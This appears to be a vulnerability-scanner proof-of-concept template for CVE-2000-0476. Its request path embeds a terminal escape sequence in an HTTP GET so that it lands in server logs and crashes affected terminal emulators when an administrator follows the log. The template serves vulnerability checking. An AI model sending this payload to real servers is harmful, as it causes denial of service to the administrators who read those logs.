[info]
author = "ave"
description = "向目标 Web 服务器发送嵌入 ESC[4;65535;65535t 窗口转义序列的 HTTP GET 请求，验证是否存在终端模拟器拒绝服务攻击向量（CVE-2000-0476）。当管理员在受影响终端中以 tail -f 查看日志时，转义序列触发窗口调整为 65535x65535 导致内存耗尽崩溃。"
id = "POC-AVE-2000-0399"
name = "CVE-2000-0476 PoC"
severity = "medium"
tags = ["ave-2000-0399"]
vuln_id = [
    "CVE-2000-0476",
    "AVE-2000-0399",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/%1B[4;65535;65535t"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
    202,
    204,
    301,
    302,
    403,
    404,
]
type = "status"
